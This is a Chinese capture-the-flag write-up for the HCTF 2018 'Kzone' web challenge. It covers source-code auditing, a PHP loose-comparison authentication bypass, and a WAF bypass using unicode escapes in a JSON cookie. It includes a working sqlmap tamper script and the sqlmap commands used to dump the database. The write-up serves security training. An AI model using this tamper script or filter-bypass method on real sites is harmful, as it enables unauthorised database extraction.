@@ -1,0 +1,399 @@
+# 用sqlmap解题2018HCTF-Kzone
+
+阅读量 **408904**
+
+|评论 **7**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2018-11-12 14:59:27
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p0.ssl.qhimg.com/t01dbc7a8449d145587.jpg)
+
+## 前言
+
+刚好周末，参加了一下HCTF，于是写篇文章记录一下 ~~也补一补双十一剁手的元气~~ 。
+
+## 信息搜集
+
+打开题目
+
+    
+    
+    http://kzone.2018.hctf.io
+
+发现跳转到QQ空间，想到可能是钓鱼网站，于是curl一下
+
+发现如下代码
+
+    
+    
+        <!--<form id="form" action="index.php" method="post" onsubmit="return onpost()"> -->
+        <form action="2018.php" method="post" onSubmit="return ts()">
+    
+            <div id="q_logon_list" class="q_logon_list"></div>
+            </div>
+            <div id="web_login">
+                <ul id="g_list">
+                    <liid
+                    ="g_u">
+                    <div id="del_touch" class="del_touch"><span id="del_u" class="del_u"></span></div>
+                    <input id="u" class="inputstyle" name="user" autocomplete="off" placeholder="KK_Account/Phone/Email"></li>
+                    <li id="g_p">
+                        <div id="del_touch_p" class="del_touch"><span id="del_p" class="del_u"></span></div>
+                        <input id="p" class="inputstyle" maxlength="16" type="password" name="pass" autocorrect="off"
+                               placeholder="Input your KK_Account please"></li>
+                </ul>
+                <button id="go" name="submit">Login</button>
+                <div href="javascript:void(0);" id="onekey">Login quickly</div>
+            </div>
+            <div id="switch">
+                <div id="swicth_login" onClick="pt._switch()" style="display:none"></div>
+                <div id="zc_feedback"><span id="zc"
+                                            onclick="window.open('https://ssl.zc.qq.com/v3/index-chs.html?from=pt')">Register</span>
+                    <span id="forgetpwd">Retrieve password</span></div>
+            </div>
+        </form>
+
+于是可以判断为钓鱼网站，首先做个目录探测，容易发现www.zip源码泄露
+
+    
+    
+    http://kzone.2018.hctf.io/www.zip
+
+## 代码审计
+
+首先是结构：
+
+admin文件夹：管理整个钓鱼网站，导出、查看、删除钓鱼信息
+
+include文件：包含一些功能性文件
+
+2018.php：钓鱼插入文件
+
+然后进行大致分析，首先查看2018.php
+
+    
+    
+    <?php
+    require_once './include/common.php';
+    $realip = real_ip();
+    $ipcount = $DB->count("SELECT count(*) from fish_user where ip='$realip'");
+    if ($ipcount < 3) {
+        $username = addslashes($_POST['user']);
+        $password = addslashes($_POST['pass']);
+        $address = getCity($realip);
+        $time = date("Y-m-d H:i:s");
+        $ua = $_SERVER['HTTP_USER_AGENT'];
+        $device = get_device($ua);
+        $sql = "INSERT INTO `fish_user`(`username`, `password`, `ip`, `address`, `time`, `device`) VALUES ('{$username}','{$password}','{$realip}','{$address}','{$time}','{$device}')";
+        $DB->query($sql);
+        header("Location: https://i.qq.com/?rd=" . $username);
+    } else {
+        header("Location: https://i.qq.com/?rd=" . $username);
+    }
+    ?>
+
+发现大概是将钓鱼用户的信息插入数据库，代码使用了许多sql语句，所以查看过滤，发现/include/safe.php有全局过滤
+
+    
+    
+    <?php
+    function waf($string)
+    {
+        $blacklist = '/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|<|>|#|s/i';
+        return preg_replace_callback($blacklist, function ($match) {
+            return '@' . $match[0] . '@';
+        }, $string);
+    }
+    .....
+    foreach ($_GET as $key => $value) {
+        if (is_string($value) && !is_numeric($value)) {
+            $value = safe($value);
+        }
+        $_GET[$key] = $value;
+    }
+    foreach ($_POST as $key => $value) {
+        if (is_string($value) && !is_numeric($value)) {
+            $value = safe($value);
+        }
+        $_POST[$key] = $value;
+    }
+    foreach ($_COOKIE as $key => $value) {
+        if (is_string($value) && !is_numeric($value)) {
+            $value = safe($value);
+        }
+        $_COOKIE[$key] = $value;
+    }
+    ?>
+
+过滤了get,post,cookie
+
+但是http header应该没经过过滤，于是想到可否控制ip，然后达成insert注入
+
+跟一下real_ip()
+
+    
+    
+    function real_ip()
+    {
+        $ip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '';
+        if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+            $list = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
+            $ip = $list[0];
+        }
+        if (!ip2long($ip)) {
+            $ip = '';
+        }
+        return $ip;
+    }
+
+发现虽然可以用xff，但是有ip2long的验证，这条路不通。
+
+那么看到admin的login.php
+
+    
+    
+    if (isset($_POST['user']) && isset($_POST['pass']) && isset($_POST['login'])) {
+        $user = addslashes($_POST['user']);
+        $pass = addslashes($_POST['pass']);
+
+上来就发现过滤，应该也无法突破。
+
+那么只能看include文件夹里有什么突破点了，看到member.php
+
+发现突破口：
+
+    
+    
+    if (isset($_COOKIE["islogin"])) {
+        if ($_COOKIE["login_data"]) {
+            $login_data = json_decode($_COOKIE['login_data'], true);
+            $admin_user = $login_data['admin_user'];
+            $udata = $DB->get_row("SELECT * FROM fish_admin WHERE username='$admin_user' limit 1");
+            if ($udata['username'] == '') {
+                setcookie("islogin", "", time() - 604800);
+                setcookie("login_data", "", time() - 604800);
+            }
+            $admin_pass = sha1($udata['password'] . LOGIN_KEY);
+            if ($admin_pass == $login_data['admin_pass']) {
+                $islogin = 1;
+            } else {
+                setcookie("islogin", "", time() - 604800);
+                setcookie("login_data", "", time() - 604800);
+            }
+        }
+    }
+
+在做admin校验的时候用了弱比较
+
+    
+    
+    if ($admin_pass == $login_data['admin_pass']) 
+    {
+        $islogin = 1;
+    }
+
+那么我们可以尝试fuzz admin_pass，从数字0开始跑，跑到65发现成功登陆admin
+
+![](https://p2.ssl.qhimg.com/t01cab03e3b356e9aa9.png)
+
+## 注入
+
+该方法来自于大哥Ricterz，鬼才真的是鬼才，方法如下：
+
+我们发现在用cookie做身份校验的时候查询了数据库
+
+    
+    
+    if ($_COOKIE["login_data"]) {
+            $login_data = json_decode($_COOKIE['login_data'], true);
+            $admin_user = $login_data['admin_user'];
+            $udata = $DB->get_row("SELECT * FROM fish_admin WHERE username='$admin_user' limit 1");
+
+发现其中用了json_decode，那么我们可以尝试使用编码进行bypass，即可无视一切过滤进行注入
+
+    
+    
+        payload = payload.replace('u', 'u0075')
+        payload = payload.replace('o', 'u006f')
+        payload = payload.replace('i', 'u0069')
+        payload = payload.replace(''', 'u0027')
+        payload = payload.replace('"', 'u0022')
+        payload = payload.replace(' ', 'u0020')
+        payload = payload.replace('s', 'u0073')
+        payload = payload.replace('#', 'u0023')
+        payload = payload.replace('>', 'u003e')
+        payload = payload.replace('<', 'u003c')
+        payload = payload.replace('-', 'u002d')
+        payload = payload.replace('=', 'u003d')
+
+![](https://p5.ssl.qhimg.com/t01d2d36c1fefbfb916.png)
+
+![](https://p5.ssl.qhimg.com/t01b3ded09aa4e39374.png)
+
+于是尝试数据库注入，打开神器sqlmap，编写一下tamper：
+
+    
+    
+    #!/usr/bin/env python
+    from lib.core.enums import PRIORITY
+    __priority__ = PRIORITY.LOW
+    
+    def dependencies():
+        pass
+    
+    def tamper(payload, **kwargs):
+        data = '''{"admin_user":"admin%s","admin_pass":65};'''
+        payload = payload.lower()
+        payload = payload.replace('u', 'u0075')
+        payload = payload.replace('o', 'u006f')
+        payload = payload.replace('i', 'u0069')
+        payload = payload.replace(''', 'u0027')
+        payload = payload.replace('"', 'u0022')
+        payload = payload.replace(' ', 'u0020')
+        payload = payload.replace('s', 'u0073')
+        payload = payload.replace('#', 'u0023')
+        payload = payload.replace('>', 'u003e')
+        payload = payload.replace('<', 'u003c')
+        payload = payload.replace('-', 'u002d')
+        payload = payload.replace('=', 'u003d')
+        return data % payload
+
+然后我们知道，目标肯定是Mysql，且这里用bool注入即可，那么我们指定bool盲注
+
+    
+    
+    --technique=B
+
+指定数据库
+
+    
+    
+    --dbms=mysql
+
+于是我们可以尝试探测一下数据库
+
+    
+    
+    sqlmap -r 1.txt --tamper=hctf --dbms=mysql --technique=B --dbs
+
+但是蛋疼的事来了，sqlmap告诉我们没有漏洞，原因肯定是sqlmap对回显识别有问题，所以我们尝试指定错误时候的回显
+
+![](https://p4.ssl.qhimg.com/t012fa5fcdbf1db8973.png)
+
+即
+
+    
+    
+    --not-string=window.location
+
+然后加点线程
+
+    
+    
+    --thread=10
+
+最后有
+
+    
+    
+    sqlmap -r 1.txt --tamper=hctf --dbms=mysql --thread=10 --technique=B --not-string=window.location --dbs
+
+即可愉快的得到结果
+
+![](https://p5.ssl.qhimg.com/t0166040db27b49be3f.png)
+
+然后指定库名跑表名
+
+    
+    
+    sqlmap -r 1.txt --tamper=hctf --dbms=mysql --thread=10 --technique=B --not-string=window.location -D hctf_kouzone --tables
+
+![](https://p0.ssl.qhimg.com/t014699292be4173de8.png)
+
+指定表名跑列名
+
+    
+    
+    sqlmap -r 1.txt --tamper=hctf --dbms=mysql --thread=10 --technique=B --not-string=window.location -D hctf_kouzone -T F1444g --columns
+
+![](https://p2.ssl.qhimg.com/t01703bf18d1ca3d2c8.png)
+
+最后在跑flag的时候又遇到跑不出来的问题
+
+    
+    
+    sqlmap -r 1.txt --tamper=hctf --dbms=mysql --thread=10 --technique=B --not-string=window.location -D hctf_kouzone -T F1444g -C F1a9 --dump
+
+看一下tamper
+
+    
+    
+    payload = payload.lower()
+
+因为我们把payload转小写了，于是我们把它转回去
+
+    
+    
+        payload = payload.replace('f1a9', 'F1a9')
+        payload = payload.replace('f1', 'F1')
+
+即可愉快的得到flag
+
+![](https://p2.ssl.qhimg.com/t0161dd0d550526944a.png)
+
+即可拿到flag
+
+## 后记
+
+以往做题都是遇到注入，自己写脚本，经过这道题目，可以充分发现sqlmap的好处非常多，也很便捷。
+
+再附上一篇参考链接
+
+    
+    
+    http://www.melodia.pw/?p=918
+
+最后，再膜一遍Ricterz！
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **一叶飘零** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/163958](/post/id/163958)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [CTF](/tag/CTF)
+  * [Web安全](/tag/Web安全)
+  * [sqlmap](/tag/sqlmap)
+  * [injection](/tag/injection)
+
+ **+1** __14赞
+
+ __收藏
+
+![](https://p0.ssl.qhimg.com/t0115eb10739cb26739.png) 一叶飘零
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
